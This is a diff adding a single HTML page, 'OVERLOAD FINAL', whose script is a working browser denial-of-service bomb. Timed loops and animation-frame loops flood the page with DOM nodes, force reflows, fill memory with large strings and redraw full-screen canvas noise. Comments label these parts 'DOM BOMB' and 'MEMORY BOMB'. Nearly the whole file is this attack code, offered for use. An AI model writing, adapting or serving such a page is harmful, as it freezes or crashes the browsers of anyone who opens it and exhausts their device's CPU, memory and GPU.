@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>OVERLOAD FINAL</title>
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background: black;
+  font-family: monospace;
+}
+
+#title {
+  position: fixed;
+  top: 0;
+  width: 100%;
+  text-align: center;
+  color: red;
+  font-size: 28px;
+  z-index: 10;
+}
+
+#container {
+  position: absolute;
+  top: 40px;
+  width: 100%;
+  height: calc(100% - 40px);
+  overflow: hidden;
+  color: #00ff00;
+  font-size: 12px;
+}
+
+.line {
+  white-space: nowrap;
+}
+
+/* canvas bruit */
+canvas {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  opacity: 0.15;
+  pointer-events: none;
+}
+</style>
+</head>
+
+<body>
+
+<div id="title">SYSTEM OVERLOAD // NO LIMIT MODE</div>
+<div id="container"></div>
+<canvas id="c"></canvas>
+
+<script>
+const container = document.getElementById("container");
+const canvas = document.getElementById("c");
+const ctx = canvas.getContext("2d");
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const memory = [];
+
+const base = [
+"STACK OVERFLOW",
+"MEMORY CORRUPT",
+"DATA BREACH",
+"NULL ERROR",
+"SYSTEM FAILURE",
+"█▓▒░ GLITCH ░▒▓█",
+"CPU MAX LOAD",
+"RAM DESTROYING",
+"CORE CRASH"
+];
+
+const symbols = "█▓▒░<>/\\|!@#$%^&*()_+=-[]{};:,.?";
+
+function rand(min, max) {
+  return Math.floor(Math.random() * (max - min) + min);
+}
+
+function noise(len) {
+  let s = "";
+  for (let i = 0; i < len; i++) {
+    s += symbols[Math.random() * symbols.length | 0];
+  }
+  return s;
+}
+
+function addLine() {
+  const text =
+    base[Math.random() * base.length | 0] +
+    " >>> " +
+    noise(rand(100, 300));
+
+  memory.push(text);
+
+  const div = document.createElement("div");
+  div.className = "line";
+  div.textContent = text;
+
+  container.appendChild(div);
+
+  // 🔥 FORCE REFLOW (très lourd)
+  container.scrollTop = container.scrollHeight;
+  container.offsetHeight;
+}
+
+// 💣 DOM BOMB
+setInterval(() => {
+  for (let i = 0; i < 300; i++) addLine();
+}, 5);
+
+// 💣 MEMORY BOMB
+setInterval(() => {
+  memory.push("█".repeat(20000));
+  memory.push(Math.random().toString(36).repeat(5000));
+}, 20);
+
+// 💣 CANVAS NOISE (GPU + CPU spike)
+function drawNoise() {
+  const img = ctx.createImageData(canvas.width, canvas.height);
+  const data = img.data;
+
+  for (let i = 0; i < data.length; i += 4) {
+    const v = Math.random() * 255;
+    data[i] = v;
+    data[i+1] = v;
+    data[i+2] = v;
+    data[i+3] = 255;
+  }
+
+  ctx.putImageData(img, 0, 0);
+
+  requestAnimationFrame(drawNoise);
+}
+drawNoise();
+
+// 💣 RAF DOM SPAM (continuous pressure)
+function loop() {
+  for (let i = 0; i < 50; i++) addLine();
+  requestAnimationFrame(loop);
+}
+loop();
+
+</script>
+
+</body>
+</html>
